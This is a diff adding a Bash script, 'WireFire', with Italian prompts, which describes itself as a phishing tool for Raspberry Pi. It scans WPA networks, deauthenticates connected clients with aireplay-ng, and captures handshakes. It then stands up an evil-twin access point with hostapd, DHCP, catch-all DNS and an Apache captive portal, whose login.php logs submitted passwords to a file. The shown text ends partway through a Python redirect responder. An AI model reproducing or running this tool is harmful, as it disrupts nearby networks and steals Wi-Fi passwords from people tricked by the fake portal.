@@ -1,0 +1,1295 @@
+#!/bin/bash
+##################################### < CONTROLLO  > #####################################
+if [[ $EUID -ne 0 ]]; then
+        echo -e "\e[1;31mDeve essere eseguito con i permessi di amministratore !"$transparent""
+        exit 1
+fi
+clear
+##################################### < CONFIGURAZIONE  > #####################################
+#Macro
+version=0.1.2
+DUMP_PATH="/tmp/WireFire"
+HANDSHAKE_PATH="/tmp/WireFire/handshakes"
+PASSLOG_PATH="/tmp/WireFire/pwlog"
+export null_output=/dev/null
+timer=1
+default_gateway="192.168.0.1"
+fake_dns_resp="8.8.8.8"
+main_page="auth.html"
+land_page="updating.html"
+error_page="post.html"
+modulo_web="et_aggiornamento/_generic"
+
+#Colori
+white="\033[1;37m"
+grey="\033[0;37m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+blue="\033[1;34m"
+transparent="\e[0m"
+##############################################################################################
+
+##################################### < INIZIO FUNZIONI > ####################################
+function conditional_clear()
+{
+
+	if [[ "$null_output" != "/dev/stdout" ]]; then clear; fi
+}
+
+function fx_restore_config {
+
+	if [ -d "backup/" ]; then
+
+		chmod 755 backup/
+
+		rm -f /etc/apache2/sites-available/000-default.conf
+		cp backup/000-default.conf /etc/apache2/sites-available/000-default.conf
+		rm -f /etc/apache2/sites-enabled/000-default.conf
+		ln -s /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-enabled/
+		
+		rm -f /etc/apache2/sites-available/default-ssl.conf
+		cp backup/default-ssl.conf /etc/apache2/sites-available/default-ssl.conf
+		rm -f /etc/apache2/sites-enabled/default-ssl.conf
+		ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/
+
+		cp backup/ports.conf /etc/apache2/ports.conf
+
+		rm -rf /var/lib/dhcp
+		rm -f /var/run/dhcpd.pid
+
+		cp backup/named.conf /etc/bind/named.conf
+		rm -rf /etc/namedb/
+
+		iptables-restore < backup/iptables_config.txt
+
+		rm -rf /var/www/captive_portal
+		rm -rf backup/
+		rm -rf /etc/apache2/captive_portal_ssl
+
+	else
+
+		echo "[!] NO BACKUP FOLDER AVAILABLE, backup may have been lost."
+		echo "    Check the problem manually."
+
+	fi
+
+}
+trap exitmode SIGINT SIGHUP
+
+function exitmode
+{	
+	fx_restore_config
+	conditional_clear
+	top
+	general_back="Back"
+	general_error_1="Not_Found"
+	general_case_error="Unknown option. Choose again"
+	general_exitmode="Cleaning and closing"	
+	general_exitmode_1="Disabling monitoring interface"
+	general_exitmode_2="Disabling interface"
+	general_exitmode_3="Disabling "$grey"forwarding of packets"
+	general_exitmode_4="Cleaning "$grey"iptables"
+	general_exitmode_5="Restoring "$grey"tput"
+	general_exitmode_6="Restarting "$grey"Network-Manager"
+	general_exitmode_7="Cleanup performed successfully!"
+
+	echo -e "\n\n"$white"["$red"-"$white"] "$red"$general_exitmode"$transparent""
+
+	if [ "$mon_mode" != "" ]; then
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$green"$mon_mode"$transparent""
+		./airmon stop $mon_mode &> $null_output
+	fi
+
+	if [ "$WIFI" != "" ]; then
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$green"$WIFI"$transparent""
+		./airmon stop $WIFI &> $null_output
+		macchanger -p $WIFI &> $null_output
+	fi
+
+	if ps -A | grep -q screen; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"screen"$transparent""
+		killall screen &>$null_output
+	fi
+
+	if ps -A | grep -q aireplay-ng; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"aireplay-ng"$transparent""
+		killall aireplay-ng &>$null_output
+	fi
+
+	if ps -A | grep -q airodump-ng; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"airodump-ng"$transparent""
+		killall airodump-ng &>$null_output
+	fi
+
+	if ps -A | grep -q bind9; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"bind9"$transparent""
+		killall bind9 &>$null_output
+	fi
+
+	if ps -A | grep -q hostapd; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"hostapd"$transparent""
+		killall hostapd &>$null_output
+	fi
+
+	if ps -A | grep -q apache2; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"apache2"$transparent""
+		killall apache2 &>$null_output
+	fi
+
+	if ps -A | grep -q dhcpd; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"dhcpd"$transparent""
+		killall dhcpd &>$null_output
+	fi
+
+	
+
+	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
+		echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_3"$transparent""
+		sysctl -w net.ipv4.ip_forward=0 &>$null_output
+	fi
+
+	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_4"$transparent""
+	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_5"$transparent""
+	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_6"$transparent""
+
+	iptables -P INPUT ACCEPT 
+	iptables -P OUTPUT ACCEPT
+	iptables -P FORWARD ACCEPT
+	iptables --flush
+	iptables --table nat --flush
+	iptables --delete-chain
+	iptables --table nat --delete-chain
+
+	#airmon-ng check kill &> $null_output &
+	/etc/init.d/bind9 stop &> $null_output &
+	service network-manager restart &> $null_output &
+	service networking restart &> $null_output &
+	rm -rf /tmp/WireFire* &> $null_output &
+	rm -rf backup/ &> $null_output &
+	rm -rf /etc/apache2/captive_portal_ssl* &> $null_output &
+	rm -rf /var/lib/dhcp &> $null_output &
+	rm -rf /var/www/captive_portal &> $null_output &
+
+	if [ -e "captive_responder.py" ]; then
+		rm captive_responder.py
+	fi
+
+	if [ -e "/tmp/captive_responder_pid" ]; then
+		pid=$(cat /tmp/captive_responder_pid)
+		kill $pid
+		rm -f /tmp/captive_responder_pid
+	fi
+	
+	echo -e ""$white"["$green"+"$white"] "$green"$general_exitmode_7"$transparent""
+	sleep 2
+	clear
+	exit
+}
+
+# Design
+function top
+{
+	clear
+	echo -e "$white#########################################################"
+	echo -e "$white#                                                       #"
+  	echo -e "$white#  $red      WIREFIRE ${yellow} $version   ${yellow}is  a  phisher  tool     $white    #"
+  	echo -e "$white#                       ${yellow}   for  a  ${red}RaspBerry PI    ${white}     #"
+	echo -e "$white#                                                       #"
+	echo -e "$white#########################################################""$transparent"
+	echo
+	echo
+	sleep 1
+}
+
+function checkdependences
+{
+	echo -ne "Aircrack-ng....."
+	if ! hash aircrack-ng 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Aireplay-ng....."
+	if ! hash aireplay-ng 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Airmon-ng......."
+	if ! hash airmon-ng 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Airodump-ng....."
+	if ! hash airodump-ng 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Apache2........."
+	if ! hash apache2 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Awk............."
+	if ! hash awk 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Bind............"
+	if ! hash bind9-config 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Dhcpd..........."
+	if ! hash dhcpd 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Hostapd........."
+	if ! hash hostapd 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Ifconfig........"
+	if ! hash ifconfig 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+
+	echo -ne "Iwconfig........"
+	if ! hash iwconfig 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Macchanger......"
+	if ! hash macchanger 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+	    echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Python.........."
+	if ! hash python 2>/dev/null; then
+		echo -e "\e[1;31mNot installed"$transparent""
+		exit=1
+	else
+		echo -e "\e[1;32mOK!"$transparent""
+	fi
+	sleep 0.025
+
+	echo -ne "Rfkill.........."
+        if ! hash rfkill 2>/dev/null; then
+                echo -e "\e[1;31mNot installed"$transparent""
+                exit=1
+        else
+                echo -e "\e[1;32mOK!"$transparent""
+        fi
+        sleep 0.025
+
+	echo -ne "Screen.........."
+        if ! hash screen 2>/dev/null; then
+                echo -e "\e[1;31mNot installed"$transparent""
+                exit=1
+        else
+                echo -e "\e[1;32mOK!"$transparent""
+        fi
+        sleep 0.025
+
+
+	if [ "$exit" = "1" ]; then
+	exit 1
+	echo "Devi risolvere le dipendenze ! ! !"
+	fi
+	sleep 4
+	clear
+}
+
+function setinterface
+{
+  Sites="~/fluxion/stable/Sites"
+  airmonfile="~/fluxion/stable/airmon"
+  if [ ! -d "$Sites" ]; then
+  	cp -r ~/fluxion/Sites ~/fluxion/stable/ &>$null_output
+  fi
+
+  if [ ! -f "$airmonfile" ]; then
+  	cp -r ~/fluxion/airmon ~/fluxion/stable/ &>$null_output
+  else
+  	echo "Manca un file cancella tutto e ripeti il download !!!"
+  fi
+
+  conditional_clear
+top
+#unblock interfaces
+rfkill unblock all
+
+# Collect all interfaces in montitor mode & stop all
+KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
+
+for monkill in ${KILLMONITOR[@]}; do
+	airmon-ng stop $monkill >$null_output
+	echo -n "$monkill, "
+done
+
+# Create a variable with the list of physical network interfaces
+readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
+INTERFACESNUMBER=`./airmon| grep -c "-"`
+
+
+if [ "$INTERFACESNUMBER" -gt "0" ]; then
+
+	echo "Seleziona la scheda di rete :"
+	echo
+	i=0
+
+	for line in "${wirelessifaces[@]}"; do
+
+		i=$(($i+1))
+		wirelessifaces[$i]=$line
+		echo -e "      $blue ""$i)"$transparent" $line"
+	done
+	echo
+	echo -n "      #> "
+	read line
+	PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
+
+	if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
+		conditional_clear
+		top
+		setinterface
+	fi
+
+	readarray -t softwaremolesto < <(./airmon check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
+	WIFIDRIVER=$(./airmon | grep "$PREWIFI" | awk '{print($(NF-2))}')
+	rmmod -f "$WIFIDRIVER" &>$null_output 2>&1
+
+	for molesto in "${softwaremolesto[@]}"; do
+		killall "$molesto" &>$null_output
+	done
+	sleep 0.5
+
+	modprobe "$WIFIDRIVER" &>$null_output 2>&1
+	sleep 0.5
+	# Select Wifi Interface
+	select PREWIFI in $INTERFACES; do
+		break;
+	done
+
+	wifi_mon_mode=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
+	mon_mode=$wifi_mon_mode
+	WIFI=$PREWIFI
+
+	#No wireless cards
+else
+
+	echo "Non ho trovato schede di rete !"
+	sleep 3
+	exitmode
+fi
+deltax
+}
+
+function deltax
+{
+	conditional_clear
+	CSVDB=dump-01.csv
+	if [ -z $mon_mode ]; then
+		conditional_clear
+		top
+		echo
+		echo
+		echo " CAMBIA SCHEDA DI RETE --> questa fa schifo al cazzo"
+		sleep 3
+		setinterface
+	fi
+
+	rm -rf $DUMP_PATH/*
+	choosescan
+	selection
+}
+
+function choosescan
+{
+
+	conditional_clear
+	while true; do
+		conditional_clear
+		top
+		echo "Scegli il tipo di scansione: "
+		echo " "
+		echo -e "      "$blue"1)"$transparent" Tutti i canali "
+		echo -e "      "$blue"2)"$transparent" Canali specifici"
+		echo
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) Scan ; break ;;
+			2 ) Scanchan ; break ;;
+			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
+		  esac
+	done
+}
+# Scansiona tutti i canali
+function Scan
+{
+	conditional_clear
+	rm -rf $DUMP_PATH/dump*
+	#xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $mon_mode --ignore-negative-one		
+	screen airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $mon_mode --ignore-negative-one -M
+}
+# Scansiona solo i canali desiderati
+function Scanchan
+{
+	conditional_clear
+	top
+	echo "Scegli i canali:    "
+	echo "                                       "
+	echo -e "     Canale singolo "$blue"6"$transparent"               "
+	echo -e "     Canali multipli "$blue"1-5"$transparent"             "
+	echo -e "     Canali multipli "$blue"1,2,5-7,11"$transparent"      "
+	echo "                                       "
+	echo -n "      #> "
+	read channel_number
+	set -- ${channel_number}
+	conditional_clear
+	rm -rf $DUMP_PATH/dump*
+	screen airodump-ng --encrypt WPA -w $DUMP_PATH/dump --channel "$channel_number" -a $mon_mode --ignore-negative-one -M
+}
+
+function selection
+{
+	conditional_clear
+	top
+	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
+
+	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
+		deltax && break
+	fi
+
+	fluxionap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
+	fluxionap=`expr $fluxionap - 1`
+	head -n $fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
+	tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
+	echo "                        LISTA RETI WIFI "
+	echo ""
+	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
+	echo ""
+	i=0
+
+	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
+		longueur=${#MAC}
+		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
+		PRIVACY=${PRIVACY:0:4}
+		if [ $longueur -ge 17 ]; then
+			i=$(($i+1))
+			POWER=`expr $POWER + 100`
+			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
+
+			if [ "$CLIENTE" != "" ]; then
+				CLIENTE="*"
+			echo -e " ""$red "$i")"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""
+
+			else
+
+			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
+
+			fi
+
+			aidlenght=$IDLENGTH
+			assid[$i]=$ESSID
+			achannel[$i]=$CHANNEL
+			amac[$i]=$MAC
+			aprivacy[$i]=$PRIVACY
+			aspeed[$i]=$SPEED
+		fi
+	done < $DUMP_PATH/dump-02.csv
+	echo
+	echo -e ""$green "("$white"*"$green")Reti con client"$transparent""
+	echo 
+	echo -e "        Seleziona la rete. Per riprovare digita$red r$transparent"
+	echo 
+	echo -n "      #> "
+	read choice
+
+	if [[ $choice -eq "r" ]]; then
+	deltax
+	fi
+
+	idlenght=${aidlenght[$choice]}
+	ssid=${assid[$choice]}
+	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
+	mac=${amac[$choice]}
+	privacy=${aprivacy[$choice]}
+	speed=${aspeed[$choice]}
+	Host_IDL=$idlength
+	Host_SPEED=$speed
+	Host_ENC=$privacy
+	Host_MAC=$mac
+	Host_CHAN=$channel
+	acouper=${#ssid}
+	fin=$(($acouper-idlength))
+	Host_SSID=${ssid:1:fin}
+
+	conditional_clear
+	askAP
+}
+
+function askAP
+{
+	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
+	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
+		selection && break
+	fi
+
+	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
+		fakeapmode="airbase-ng"
+		askauth
+	fi
+
+	top
+	fakeapmode="hostapd"
+	handshakelocation
+}
+
+function infoap
+{
+	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
+	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
+	echo "INFO WIFI"
+	echo
+	echo -e "               "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
+	echo -e "               "$blue"Canale"$transparent" = $channel"
+	echo -e "               "$blue"Velocità"$transparent" = ${speed:2} Mbps"
+	echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
+	echo
+	echo "Il programma deautenticherà la rete per 30 secondi se non "
+	echo "viene  trovato  l'handshake chiudi  la  finestra e ritenta."
+	echo
+	sleep 5
+}
+
+function handshakelocation
+{
+	conditional_clear
+	top
+	infoap
+	handshakeloc = $HANDSHAKE_PATH
+
+		if [ "$handshakeloc" = "" ]; then
+			deauthforce
+		else
+			echo "Errore nella creazione della cartella /root/handshakes"
+		fi
+}
+
+function deauthall
+{
+	screen -dmS deautenticatore "aireplay-ng" "-0" "$timer" "-a" "$Host_MAC" "--ignore-negative-one" "$mon_mode"
+	#screen -r deautenticatore //torna al display aireplay
+	#ctrl+a crtl+d esce e lo lascia aperto
+	#killall screen chiude tutti i processi
+}
+
+function capture
+{
+	conditional_clear
+	sleep 2
+	if ! ps -A | grep -q airodump-ng; then
+		rm -rf $DUMP_PATH/$Host_MAC*
+		screen airodump-ng --ignore-negative-one --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $mon_mode
+	else 
+		echo "P-A-N-I-C chiudi il terminare e riesegui ! "		
+	fi
+}
+
+function deauth
+{
+	timer=60
+	conditional_clear
+	iwconfig $mon_mode channel $Host_CHAN
+	DEAUTH=deauthall
+	$DEAUTH & capture
+	CSVDB=$Host_MAC-01.csv
+	deauthMENU
+
+}
+function deauthMENU
+{
+
+	while true; do
+		conditional_clear
+		clear
+		top
+
+		echo "DEAUTENTICAZIONE EFFETTUATA"
+		echo
+		echo -e "Handshake: $Handshake_statuscheck"
+		echo
+		echo -e "      "$blue"1)"$transparent" Controllo Handshake"
+		echo -e "      "$blue"2)"$transparent" Riprovare"
+		echo -e "      "$blue"3)"$transparent" Seleziona un altra rete"
+		echo -e "      "$blue"4)"$transparent" Exit"
+		echo
+		echo -n "      #> "
+		read yn
+
+		case $yn in
+			1 ) checkhandshake;;
+			2 ) rm $DUMP_PATH/$Host_MAC*; conditional_clear; netdeauth; break;;
+			3 ) killall airodump-ng aireplay-ng &>$null_output; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
+			4 ) exitmode; break;;
+			* ) echo "$general_case_error"; conditional_clear ;;
+		esac
+	done
+}
+
+function deauthforce
+{
+	conditional_clear
+	top
+	handshakemode="normal"
+	netdeauth	
+}
+
+function netdeauth
+{
+	conditional_clear
+	while true; do
+		top
+		echo "DEAUTENTICAZIONE EFFETTUATA"
+		echo "                                       "
+		deauth
+	done
+}
+
+function checkhandshake
+{
+	if [ "$handshakemode" = "normal" ]; then
+		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
+			killall airodump-ng aireplay-ng &>$null_output
+			#wpaclean $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$null_output
+			module_select
+			break
+		else
+			Handshake_statuscheck="${red}Not_Found$transparent"
+		fi
+		rm $DUMP_PATH/test.cap &>$null_output
+	fi
+}
+
+function module_select
+{
+	conditional_clear
+	top
+	if [ -d "ap_module/mod/" ]; then
+		i=1
+		echo
+		echo -e "HANDSHAKE TROVATO --> Seleziona il modulo web che vuoi utilizzare :"
+		echo
+	for file in ap_module/mod/*; do
+  			v="$file"
+			v2=${v:14} #vs=${v::-4}
+			echo -e $blue ""$i")"$transparent" $v2"
+			lista[$i]=$v2
+			((i++))
+		done
+		echo
+		echo -n "     #> "
+		read yn
+		((i--))
+		echo $i
+		if [ $yn -ge 1 ] && [ $yn -le $i ]; then
+			modulo_web="ap_module/mod/"${lista[$yn]}
+			webinterface
+		else
+			echo "Hai scritto una minchiata"
+			top
+			module_select
+		fi
+		echo
+		echo
+		echo "Porcodio ti manca la cartella con i moduli web"
+		echo "Cancella tutto e ripeti il download"
+		exit
+	fi
+}
+
+function killatutto
+{
+	killall aireplay-ng &>$null_output
+	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$null_output
+	killall hostapd &>$null_output
+	killall dhcpd &>$null_output
+}
+
+function creaAP
+{			
+	echo
+	fx_backup_config
+	###########################################################
+
+	a2enmod ssl &> $null_output					# SSL config
+	mkdir /etc/apache2/captive_portal_ssl 		# SSL config
+
+	if [ -f "/etc/apache2/captive_portal_ssl/apache.pem" ] || [ -f "/etc/apache2/captive_portal_ssl/apache.key" ]; then
+		echo "[*] Using existent ssl certificates"
+	else
+		rm -f /etc/apache2/captive_portal_ssl/apache.pem
+		rm -f /etc/apache2/captive_portal_ssl/apache.key
+		openssl req -new -x509 -days 365 -nodes -out /etc/apache2/captive_portal_ssl/apache.pem -keyout /etc/apache2/captive_portal_ssl/apache.key -subj "/C=NL/ST=user/L=Rotterdam/O=Network/OU=IT Department/CN=ssl.net.org" &> $null_output
+	fi
+
+
+	(echo '<VirtualHost *:8000>
+		ServerAdmin *
+
+		DocumentRoot /var/www/captive_portal
+		
+		ErrorDocument 404 /index.php
+		ErrorDocument 500 /index.php
+		ErrorDocument 503 /index.php
+
+		<Directory />
+			Options FollowSymLinks
+			AllowOverride None
+		</Directory>
+		<Directory /var/www/captive_portal>
+			Options Indexes FollowSymLinks MultiViews
+			AllowOverride None
+			Order allow,deny
+			allow from all
+		</Directory>
+
+		ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+		<Directory "/usr/lib/cgi-bin">
+			AllowOverride None
+			Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
+			Order allow,deny
+			Allow from all
+		</Directory>
+
+		ErrorLog ${APACHE_LOG_DIR}/error.log
+
+		# Possible values include: debug, info, notice, warn, error, crit,
+		# alert, emerg.
+		LogLevel warn
+
+		CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+		Alias /doc/ "/usr/share/doc/"
+		<Directory "/usr/share/doc/">
+			Options Indexes MultiViews FollowSymLinks
+			AllowOverride None
+			Order deny,allow
+			Deny from all
+			Allow from 127.0.0.0/255.0.0.0 ::1/128
+		</Directory>
+
+	</VirtualHost>') > /etc/apache2/sites-available/000-default.conf
+
+
+	(echo '<IfModule mod_ssl.c>
+		<VirtualHost *:443>
+			ServerAdmin *
+			DocumentRoot /var/www/captive_portal
+
+			ErrorDocument 404 /index.php
+			ErrorDocument 500 /index.php
+			ErrorDocument 503 /index.php
+			
+			ErrorLog ${APACHE_LOG_DIR}/error.log
+			CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+			SSLEngine on
+
+			SSLCertificateFile	/etc/apache2/captive_portal_ssl/apache.pem
+			SSLCertificateKeyFile /etc/apache2/captive_portal_ssl/apache.key
+
+			
+			<FilesMatch "\.(cgi|shtml|phtml|php)$">
+					SSLOptions +StdEnvVars
+			</FilesMatch>
+			<Directory /usr/lib/cgi-bin>
+					SSLOptions +StdEnvVars
+			</Directory>
+			
+
+		</VirtualHost>
+	</IfModule>') > /etc/apache2/sites-available/default-ssl.conf 		# SSL config
+
+
+	(echo '# If you just change the port or add more ports here, you will likely also
+	# have to change the VirtualHost statement in
+	# /etc/apache2/sites-enabled/000-default.conf
+
+	Listen 8000
+
+	<IfModule ssl_module>
+		Listen 443
+	</IfModule>
+
+	#<IfModule mod_ssl.c>
+	#    # If you add NameVirtualHost *:443 here, you will also have to change
+	#    # the VirtualHost statement in /etc/apache2/sites-available/default-ssl
+	#    # to <VirtualHost *:443>
+	#    # Server Name Indication for SSL named virtual hosts is currently not
+	#    # supported by MSIE on Windows XP.
+	#    NameVirtualHost *:443
+	#    Listen 443
+	#</IfModule>
+
+	#<IfModule mod_gnutls.c>
+	#    Listen 443
+	#</IfModule>
+
+	# vim: syntax=apache ts=4 sw=4 sts=4 sr noet') > /etc/apache2/ports.conf
+
+
+	rm -f /etc/apache2/sites-enabled/000-default.conf
+	ln -s /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-enabled/
+
+	rm -f /etc/apache2/sites-enabled/default-ssl.conf
+	ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/
+
+	mkdir /var/www/captive_portal
+	cp -r $modulo_web/* /var/www/captive_portal/
+	cp -r ap_module/_bootstrap/* /var/www/captive_portal/
+
+
+	(echo "<?php
+	http_response_code(302);
+	header(\"Location:http://$default_gateway/$main_page\");
+	exit();
+	?>") > /var/www/captive_portal/index.php
+
+
+	(echo "<?php
+	\$a = \$_REQUEST[\"email\"];
+	\$b = \$_REQUEST[\"pass\"];
+	if(\$a == \$b)
+	{
+		\$data = \"\$a\".\"\n\";
+
+		//open the file and choose the mode
+		\$fh = fopen(\"users.txt\", \"a\");
+		fwrite(\$fh, \$data);
+		fclose(\$fh);
+		\$filename = '/var/www/captive_portal/pass.txt';
+
+		if (file_exists(\$filename)) {
+    		header(\"location:$land_page\");
+		}
+		else
+		{
+    		header(\"location:$error_page\");
+		}
+	}
+	else
+	{
+		header(\"location:$main_page\");
+	}
+	?>")  > /var/www/captive_portal/login.php
+
+	touch /var/www/captive_portal/users.txt
+	chmod 777 /var/www/captive_portal/* -R
+	chmod 666 /var/www/captive_portal/users.txt
+
+	a2ensite default-ssl &> $null_output				# SSL config
+	service apache2 reload &> $null_output				# SSL config
+
+	/etc/init.d/apache2 stop &> $null_output
+	/etc/init.d/apache2 start &> $null_output
+	#/etc/init.d/apache2 restart
+
+	###########################################################
+
+	(echo "interface=$WIFI
+driver=nl80211
+ssid=$Host_SSID
+hw_mode=g
+channel=$channel
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=0
+wpa_passphrase=password
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP") > hostpad-conf.conf
+
+	hostapd hostpad-conf.conf -B &> $null_output
+
+	rm hostpad-conf.conf 
+	###########################################################
+	mkdir /var/lib/dhcp
+	touch /var/lib/dhcp/dhcpd.leases
+
+	ifconfig $WIFI up
+	ifconfig $WIFI 192.168.0.1 netmask 255.255.255.0
+
+	touch /var/run/dhcpd.pid
+	chmod +x /var/run/dhcpd.pid
+
+	(echo "authoritative;
+default-lease-time 600;
+max-lease-time 7200;
+subnet 192.168.0.0 netmask 255.255.255.0 {
+		option subnet-mask 255.255.255.0;
+		option broadcast-address 192.168.0.255;
+		option routers 192.168.0.1;
+		option domain-name-servers 192.168.0.1; #DNS SERVER
+		range 192.168.0.2 192.168.0.202;
+}") > /var/lib/dhcp/dhcpd-conf.conf
+
+	dhcpd -q -cf /var/lib/dhcp/dhcpd-conf.conf $WIFI &> $null_output
+
+
+
+	###########################################################
+
+(echo 'options {
+	directory	"/etc/namedb";
+	pid-file	"/var/run/named/pid";
+	allow-query	{ any; };
+	allow-recursion	{ any; };
+};
+
+
+zone "." {
+	type master;
+	file "/etc/namedb/db.catchall";
+};') > /etc/bind/named.conf
+
+	#---------------------------------------------------------#
+	rm -rf /etc/namedb/
+	mkdir -p /etc/namedb/
+
+	
+(echo "$""TTL    604800
+@       IN      SOA     . root.localhost. (
+							  1         ; Serial
+						 604800         ; Refresh
+						  86400         ; Retry
+						2419200         ; Expire
+						 604800 )       ; Negative Cache TTL
+
+	IN	NS	.
+.	IN	A	$fake_dns_resp
+*.	IN	A	$fake_dns_resp") > /etc/namedb/db.catchall
+
+	/etc/init.d/bind9 stop &> $null_output
+	/etc/init.d/bind9 start &> $null_output
+	#/etc/init.d/bind9 restart
+
+	###########################################################
+
+	(echo "import socket
+import time
+import os
+import sys
+import thread
+from threading import Thread
+
+def responder(conn, addr, response):
+	request = conn.recv(1024*32)
+	#print addr
+	#print request
+
+	print '[*] Responding at: ' + str(addr)
+
+	conn.sendall(response)
+	conn.close()
+
+
+captive = '''\
+HTTP/1.0 302 Redirect
+Server: OpenRG
+Content-Type: text/html
+Location: http://$default_gateway:8000/$main_page
+Connection: close
+
+<!DOCTYPE html>
+<html>
+	<br>
+</html>
+'''
+
+cp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
